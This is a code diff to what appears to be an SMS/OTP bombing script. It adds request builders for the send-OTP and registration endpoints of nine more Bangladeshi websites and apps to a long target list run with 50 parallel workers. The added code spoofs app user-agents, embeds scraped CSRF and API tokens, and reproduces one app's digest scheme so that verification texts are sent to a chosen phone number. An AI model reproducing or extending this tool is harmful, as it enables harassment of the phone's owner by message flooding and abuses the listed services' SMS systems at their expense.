@@ -456,6 +456,57 @@ def build_request(api, phone):
             body = json.dumps({"email_or_phone": pp, "send_code_by": "phone"})
             h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json',
                  'User-Agent': 'Dart/3.4 (dart:io)', 'authorization': 'Bearer null'}
+        elif api == 'ieducation':
+            url = 'https://www.ieducationbd.com/v1/api/account/register'
+            body = f"mobile={pr}&username={''.join(random.choice(string.ascii_lowercase) for _ in range(13))}"
+            h = {'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json',
+                 'User-Agent': 'Dart/3.5 (dart:io)'}
+        elif api == 'brritto':
+            url = 'https://api.brritto.com/api/v1/auth/send-otp'
+            body = json.dumps({"mobileNumber": pr})
+            h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json',
+                 'User-Agent': 'Dart/3.5 (dart:io)'}
+        elif api == 'edgecourse':
+            url = 'https://api.edgecoursebd.com/api/auth/temporary-register/'
+            body = json.dumps({"phone": pr})
+            h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*',
+                 'User-Agent': 'Dart/3.5 (dart:io)'}
+        elif api == 'shopbase':
+            url = 'https://shopbasebd.com/store/registration/sendOTP'
+            body = f'number={pr}&_token=1jXdRS2D9yaoOn7MbQGBb2IDVImUetZLA8dYBTEP'
+            h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*',
+                 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest',
+                 'Origin': 'https://shopbasebd.com', 'Referer': 'https://shopbasebd.com/store/registration/otp'}
+        elif api == 'jamakapor':
+            url = 'https://www.jamakapor.com.bd/api/v1/auth/check-phone'
+            body = json.dumps({"phone": pp, "temporary_token": "PMD2mz3AYM1mOx7hwmGCLVnNDx8Gvf9Pv8geN12L"})
+            h = {'Content-Type': 'application/json; charset=UTF-8', 'Accept': 'application/json',
+                 'User-Agent': 'Dart/3.5 (dart:io)'}
+        elif api == 'quizbd':
+            ts = str(int(time.time()))
+            dg = hashlib.sha256(f"quizbd_salt{ts}".encode()).hexdigest()
+            url = 'https://developer.quizbd.app/api/v2.0/send-otp'
+            body = json.dumps({"country_code": "+88", "phone": pr, "timestamp": ts, "digest": dg})
+            h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json',
+                 'User-Agent': 'Dart/3.5 (dart:io)'}
+        elif api == 'shukhee':
+            url = 'https://notifyv2.shukhee.com/api/shoot-otp/mobile'
+            body = json.dumps({"app_id": "shukheeOTP2025",
+                               "api_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3ODU2OTY3NDYsImV4cCI6MTc4NjI5Njc0Nn0.test",
+                               "mobile": pp})
+            h = {'Content-Type': 'application/json; charset=UTF-8', 'Accept': 'application/json',
+                 'User-Agent': 'dart/3.5 (dart:io)'}
+        elif api == 'smartsohay':
+            url = 'https://yunpodyw5-api.smartsohay.com/api/send-otp/'
+            body = json.dumps({"phone_number": pr})
+            h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*',
+                 'User-Agent': 'Dart/3.5 (dart:io)'}
+        elif api == 'shikhosms':
+            url = 'https://api.shikho.com/auth/v2/send/sms'
+            body = json.dumps({"phone": p8, "type": "student", "auth_type": "login", "vendor": "shikho",
+                               "google_ads_id": "a9b2dfa9-6a62-4d27-b37b-216ca4dc2bf5"})
+            h = {'Content-Type': 'application/json', 'Accept': 'application/json',
+                 'User-Agent': 'Dart/3.5 (dart:io)'}
         elif api == 'udvash':
             url = f'https://online.udvash-unmesh.com/Registration?nickName={urllib.urlencode(fN)}&mobileNumber={p8}'
             body = ''
@@ -475,7 +526,7 @@ APIS = [
     'cinespot','edutubebd','propertywala','bengalmeat_otp','perfumeshop','bookhouse',
     'watchzonebd','telicall','bdjob','chorcha','epharma','jachail','pbazaar','iscreen',
     'rabbithole','medeasy','jatri','shajgoj','iqralive','quizgiri','ghorerbazar','pathao','garibook','shadhin','khaasfood',
-    'suzuki','biddabari','karobar','packly','carrybee_verify','carrybee_register','eziclick','livemcq','timezonebd','shaddho','udvash','amarbay','rhombus','toffee','apcom'
+    'suzuki','biddabari','karobar','packly','carrybee_verify','carrybee_register','eziclick','livemcq','timezonebd','shaddho','udvash','amarbay','rhombus','toffee','apcom','ieducation','brritto','edgecourse','shopbase','jamakapor','quizbd','shukhee','smartsohay','shikhosms'
 ]
 
 MAX_WORKERS = 50
